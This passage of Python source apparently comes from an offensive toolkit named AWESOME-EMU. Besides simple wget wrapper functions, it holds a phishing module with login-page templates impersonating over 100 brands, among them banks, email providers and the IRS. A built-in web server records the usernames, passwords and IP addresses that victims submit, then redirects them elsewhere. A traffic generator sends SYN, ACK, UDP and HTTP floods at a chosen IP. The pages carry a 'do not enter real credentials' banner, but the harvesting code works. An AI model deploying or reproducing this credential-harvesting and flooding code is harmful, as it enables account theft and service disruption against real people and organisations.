    def backup_converted(url: str) -> CommandResult:
        """Backup converted files"""
        start_time = time.time()
        try:
            cmd = ['wget', '-K', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def adjust_extension(url: str) -> CommandResult:
        """Adjust extension"""
        start_time = time.time()
        try:
            cmd = ['wget', '-E', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def restrict_file_names(url: str) -> CommandResult:
        """Restrict file names"""
        start_time = time.time()
        try:
            cmd = ['wget', '--restrict-file-names=unix', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def trust_server_names(url: str) -> CommandResult:
        """Trust server names"""
        start_time = time.time()
        try:
            cmd = ['wget', '--trust-server-names', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def content_disposition(url: str) -> CommandResult:
        """Content disposition"""
        start_time = time.time()
        try:
            cmd = ['wget', '--content-disposition', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def random_wait(url: str) -> CommandResult:
        """Random wait"""
        start_time = time.time()
        try:
            cmd = ['wget', '--random-wait', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wait(url: str, seconds: int) -> CommandResult:
        """Wait between downloads"""
        start_time = time.time()
        try:
            cmd = ['wget', '-w', str(seconds), url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def waitretry(url: str, seconds: int) -> CommandResult:
        """Wait between retries"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--waitretry={seconds}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def quota(url: str, quota: str) -> CommandResult:
        """Set quota"""
        start_time = time.time()
        try:
            cmd = ['wget', '-Q', quota, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns_timeout(url: str, seconds: int) -> CommandResult:
        """DNS timeout"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--dns-timeout={seconds}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def connect_timeout(url: str, seconds: int) -> CommandResult:
        """Connect timeout"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--connect-timeout={seconds}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def read_timeout(url: str, seconds: int) -> CommandResult:
        """Read timeout"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--read-timeout={seconds}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=seconds + 30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def inet4_only(url: str) -> CommandResult:
        """IPv4 only"""
        start_time = time.time()
        try:
            cmd = ['wget', '-4', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def inet6_only(url: str) -> CommandResult:
        """IPv6 only"""
        start_time = time.time()
        try:
            cmd = ['wget', '-6', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def prefer_family(url: str, family: str) -> CommandResult:
        """Prefer address family"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--prefer-family={family}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def bind_address(url: str, address: str) -> CommandResult:
        """Bind to address"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--bind-address={address}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_dns_cache(url: str) -> CommandResult:
        """No DNS cache"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-dns-cache', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_http_keep_alive(url: str) -> CommandResult:
        """No HTTP keep-alive"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-http-keep-alive', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_cache(url: str) -> CommandResult:
        """No cache"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-cache', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_cookies(url: str) -> CommandResult:
        """No cookies"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-cookies', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def load_cookies(url: str, cookie_file: str) -> CommandResult:
        """Load cookies"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--load-cookies={cookie_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def keep_session_cookies(url: str, cookie_file: str) -> CommandResult:
        """Keep session cookies"""
        start_time = time.time()
        try:
            cmd = ['wget', '--keep-session-cookies', f'--save-cookies={cookie_file}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_file(url: str, prefix: str) -> CommandResult:
        """WARC file"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--warc-file={prefix}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_header(url: str, header: str) -> CommandResult:
        """WARC header"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--warc-header={header}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_max_size(url: str, size: str) -> CommandResult:
        """WARC max size"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--warc-max-size={size}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_cdx(url: str) -> CommandResult:
        """WARC CDX"""
        start_time = time.time()
        try:
            cmd = ['wget', '--warc-cdx', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_dedup(url: str, file_path: str) -> CommandResult:
        """WARC dedup"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--warc-dedup={file_path}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_warc_compression(url: str) -> CommandResult:
        """No WARC compression"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-warc-compression', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_warc_digests(url: str) -> CommandResult:
        """No WARC digests"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-warc-digests', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def no_warc_keep_log(url: str) -> CommandResult:
        """No WARC keep log"""
        start_time = time.time()
        try:
            cmd = ['wget', '--no-warc-keep-log', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def warc_tempdir(url: str, directory: str) -> CommandResult:
        """WARC temp directory"""
        start_time = time.time()
        try:
            cmd = ['wget', f'--warc-tempdir={directory}', url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def help() -> CommandResult:
        """Wget help"""
        start_time = time.time()
        try:
            cmd = ['wget', '--help']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def version() -> CommandResult:
        """Wget version"""
        start_time = time.time()
        try:
            cmd = ['wget', '--version']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(True, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))

# =====================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools with 100+ templates"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load all phishing templates"""
        return {
            # Social Media (20)
            'facebook': self._get_template("Facebook", "#1877f2"),
            'instagram': self._get_template("Instagram", "#0095f6"),
            'twitter': self._get_template("X / Twitter", "#1d9bf0"),
            'linkedin': self._get_template("LinkedIn", "#0a66c2"),
            'tiktok': self._get_template("TikTok", "#fe2c55"),
            'snapchat': self._get_template("Snapchat", "#fffc00"),
            'reddit': self._get_template("Reddit", "#ff4500"),
            'pinterest': self._get_template("Pinterest", "#e60023"),
            'tumblr': self._get_template("Tumblr", "#36465d"),
            'flickr': self._get_template("Flickr", "#ff0084"),
            'vk': self._get_template("VK", "#4c75a3"),
            'weibo': self._get_template("Weibo", "#e6162d"),
            'telegram': self._get_template("Telegram", "#2aabee"),
            'whatsapp': self._get_template("WhatsApp", "#25d366"),
            'discord': self._get_template("Discord", "#5865f2"),
            'slack': self._get_template("Slack", "#611f69"),
            'mastodon': self._get_template("Mastodon", "#6364ff"),
            'threads': self._get_template("Threads", "#000000"),
            'clubhouse': self._get_template("Clubhouse", "#f0e5d8"),
            'nextdoor': self._get_template("Nextdoor", "#8ed500"),
            
            # Email Providers (15)
            'gmail': self._get_template("Gmail", "#1a73e8"),
            'yahoo': self._get_template("Yahoo", "#410093"),
            'outlook': self._get_template("Outlook", "#0078d4"),
            'hotmail': self._get_template("Hotmail", "#0078d4"),
            'aol': self._get_template("AOL", "#0060a9"),
            'protonmail': self._get_template("ProtonMail", "#505061"),
            'zoho': self._get_template("Zoho", "#e42527"),
            'icloud': self._get_template("iCloud", "#0071e3"),
            'gmx': self._get_template("GMX", "#1c449b"),
            'mail_com': self._get_template("Mail.com", "#004d8c"),
            'yandex': self._get_template("Yandex", "#fc3f1d"),
            'fastmail': self._get_template("FastMail", "#0067c5"),
            'tutanota': self._get_template("Tutanota", "#840010"),
            'mailfence': self._get_template("Mailfence", "#00a4e4"),
            'posteo': self._get_template("Posteo", "#00954c"),
            
            # Cloud Storage (10)
            'dropbox': self._get_template("Dropbox", "#0061ff"),
            'google_drive': self._get_template("Google Drive", "#4285f4"),
            'onedrive': self._get_template("OneDrive", "#0078d4"),
            'icloud_drive': self._get_template("iCloud Drive", "#0071e3"),
            'box': self._get_template("Box", "#0061d5"),
            'mega': self._get_template("MEGA", "#d9272e"),
            'pcloud': self._get_template("pCloud", "#00b0ff"),
            'mediafire': self._get_template("MediaFire", "#1299f3"),
            'sync_com': self._get_template("Sync.com", "#0078d4"),
            'amazon_drive': self._get_template("Amazon Drive", "#ff9900"),
            
            # Financial (15)
            'paypal': self._get_template("PayPal", "#0070ba"),
            'venmo': self._get_template("Venmo", "#008cff"),
            'cashapp': self._get_template("Cash App", "#00d632"),
            'zelle': self._get_template("Zelle", "#6d1ed4"),
            'chase': self._get_template("Chase", "#1174c2"),
            'wells_fargo': self._get_template("Wells Fargo", "#bc1f2c"),
            'bank_of_america': self._get_template("Bank of America", "#012169"),
            'citibank': self._get_template("Citibank", "#003b70"),
            'capital_one': self._get_template("Capital One", "#004977"),
            'discover': self._get_template("Discover", "#ff6000"),
            'american_express': self._get_template("American Express", "#006fcf"),
            'barclays': self._get_template("Barclays", "#00aeef"),
            'hsbc': self._get_template("HSBC", "#db0011"),
            'santander': self._get_template("Santander", "#ec0000"),
            'revolut': self._get_template("Revolut", "#0075eb"),
            
            # Gaming (15)
            'steam': self._get_template("Steam", "#67c1f5"),
            'epic_games': self._get_template("Epic Games", "#000000"),
            'roblox': self._get_template("Roblox", "#e32c2c"),
            'minecraft': self._get_template("Minecraft", "#6b8c42"),
            'xbox': self._get_template("Xbox", "#107c10"),
            'playstation': self._get_template("PlayStation", "#003791"),
            'nintendo': self._get_template("Nintendo", "#e60012"),
            'twitch': self._get_template("Twitch", "#9146ff"),
            'discord_gaming': self._get_template("Discord Gaming", "#5865f2"),
            'riot_games': self._get_template("Riot Games", "#d13639"),
            'blizzard': self._get_template("Blizzard", "#00aeff"),
            'ea_games': self._get_template("EA Games", "#ff0000"),
            'ubisoft': self._get_template("Ubisoft", "#0070ff"),
            'rockstar': self._get_template("Rockstar Games", "#fcaf17"),
            'gog': self._get_template("GOG", "#8b00ff"),
            
            # Streaming (10)
            'netflix': self._get_template("Netflix", "#e50914"),
            'hulu': self._get_template("Hulu", "#1ce783"),
            'disney_plus': self._get_template("Disney+", "#113ccf"),
            'hbo_max': self._get_template("HBO Max", "#5822b4"),
            'amazon_prime': self._get_template("Amazon Prime", "#00a8e1"),
            'spotify': self._get_template("Spotify", "#1ed760"),
            'apple_music': self._get_template("Apple Music", "#fa243c"),
            'youtube_premium': self._get_template("YouTube Premium", "#ff0000"),
            'peacock': self._get_template("Peacock", "#000000"),
            'paramount_plus': self._get_template("Paramount+", "#0064ff"),
            
            # Productivity (15)
            'microsoft': self._get_template("Microsoft", "#0078d4"),
            'google': self._get_template("Google", "#4285f4"),
            'apple': self._get_template("Apple", "#0071e3"),
            'adobe': self._get_template("Adobe", "#ff0000"),
            'zoom': self._get_template("Zoom", "#2d8cff"),
            'teams': self._get_template("Teams", "#5059e8"),
            'webex': self._get_template("Webex", "#00bceb"),
            'slack_workspace': self._get_template("Slack Workspace", "#611f69"),
            'asana': self._get_template("Asana", "#f06a6a"),
            'trello': self._get_template("Trello", "#0079bf"),
            'notion': self._get_template("Notion", "#000000"),
            'evernote': self._get_template("Evernote", "#00a82d"),
            'todoist': self._get_template("Todoist", "#e44332"),
            'monday': self._get_template("Monday.com", "#ff3d57"),
            'clickup': self._get_template("ClickUp", "#7b68ee"),
            
            # Shopping (10)
            'amazon': self._get_template("Amazon", "#ff9900"),
            'ebay': self._get_template("eBay", "#e53238"),
            'walmart': self._get_template("Walmart", "#0071ce"),
            'target': self._get_template("Target", "#cc0000"),
            'best_buy': self._get_template("Best Buy", "#0046be"),
            'costco': self._get_template("Costco", "#e31837"),
            'alibaba': self._get_template("Alibaba", "#ff6a00"),
            'aliexpress': self._get_template("AliExpress", "#ff4747"),
            'etsy': self._get_template("Etsy", "#f1641e"),
            'shopify': self._get_template("Shopify", "#96bf48"),
            
            # Cloud & Services (10)
            'aws': self._get_template("AWS", "#ff9900"),
            'azure': self._get_template("Azure", "#0078d4"),
            'gcp': self._get_template("Google Cloud", "#4285f4"),
            'digitalocean': self._get_template("DigitalOcean", "#0080ff"),
            'cloudflare': self._get_template("Cloudflare", "#f38020"),
            'namecheap': self._get_template("Namecheap", "#de3723"),
            'godaddy': self._get_template("GoDaddy", "#00a4a6"),
            'heroku': self._get_template("Heroku", "#430098"),
            'vercel': self._get_template("Vercel", "#000000"),
            'netlify': self._get_template("Netlify", "#00c7b7"),
            
            # Education (5)
            'coursera': self._get_template("Coursera", "#0056d2"),
            'udemy': self._get_template("Udemy", "#a435f0"),
            'edx': self._get_template("edX", "#02262b"),
            'khanacademy': self._get_template("Khan Academy", "#14bf96"),
            'duolingo': self._get_template("Duolingo", "#58cc71"),
            
            # Government (5)
            'irs': self._get_template("IRS", "#003366"),
            'dmv': self._get_template("DMV", "#003366"),
            'usps': self._get_template("USPS", "#333366"),
            'fedex': self._get_template("FedEx", "#4d148c"),
            'ups': self._get_template("UPS", "#351c15"),
            
            # VPN & Security (5)
            'nordvpn': self._get_template("NordVPN", "#4687ff"),
            'expressvpn': self._get_template("ExpressVPN", "#da3940"),
            'surfshark': self._get_template("Surfshark", "#1ebfbf"),
            'lastpass': self._get_template("LastPass", "#d32d27"),
            '1password': self._get_template("1Password", "#0572ec"),
            
            # Custom
            'custom': self._custom_template()
        }
    
    def _get_template(self, name: str, color: str) -> str:
        """Generate a phishing template"""
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Login</title>
<style>
body{{font-family:'Courier New',monospace;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:#000;border:2px solid #fff;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,255,255,0.3)}}
.logo{{color:#fff;font-size:32px;text-align:center;margin-bottom:30px;letter-spacing:4px;text-transform:uppercase}}
input{{width:100%;padding:14px;margin:10px 0;background:#000;border:2px solid #fff;box-sizing:border-box;color:#fff;font-family:'Courier New',monospace}}
input:focus{{outline:none;border-color:#fff;box-shadow:0 0 15px rgba(255,255,255,0.5)}}
button{{width:100%;padding:14px;background:#fff;color:#000;border:none;font-size:20px;cursor:pointer;font-weight:bold;font-family:'Courier New',monospace;letter-spacing:2px}}
button:hover{{background:#000;color:#fff;border:2px solid #fff}}
.warning{{margin-top:20px;padding:10px;background:rgba(255,0,0,0.2);color:#ff6b6b;text-align:center;font-size:12px;border:1px solid #ff6b6b}}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">{name}</div>
<form method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _custom_template(self) -> str:
        """Generate custom template"""
        return '''<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:'Courier New',monospace;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:#000;border:2px solid #fff;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,255,255,0.3)}
.logo{text-align:center;margin-bottom:30px;color:#fff;font-size:28px;font-weight:bold;letter-spacing:6px}
input{width:100%;padding:14px;margin:10px 0;background:#000;border:2px solid #fff;color:#fff;box-sizing:border-box;font-family:'Courier New',monospace}
input:focus{outline:none;border-color:#fff;box-shadow:0 0 15px rgba(255,255,255,0.5)}
button{width:100%;padding:14px;background:#fff;color:#000;border:none;cursor:pointer;font-weight:bold;font-size:16px;font-family:'Courier New',monospace;letter-spacing:2px}
button:hover{background:#000;color:#fff;border:2px solid #fff}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.2);border:1px solid #ff6b6b;color:#ff6b6b;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">AWESOME-EMU</div>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">SECURE LOGIN</button>
</form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def generate_phishing_link(self, platform: str) -> Dict:
        """Generate a phishing link"""
        link_id = str(uuid.uuid4())[:8]
        template_func = self.templates.get(platform, self._custom_template)
        html = template_func() if callable(template_func) else template_func
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server"""
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.SUCCESS}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        """Stop phishing server"""
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    """Traffic generation engine"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        """Generate traffic"""
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        """Run traffic generator"""
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
    
    def _get_generator_func(self, traffic_type: str):
        """Get traffic generator function"""
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        """Send ICMP packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        """Send TCP SYN packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        """Send TCP ACK packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        """TCP connect"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        """Send UDP packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"AWESOME_EMU"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"AWESOME_EMU", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        """HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "AWESOME-EMU"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        """HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "AWESOME-EMU"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        """HTTPS request"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
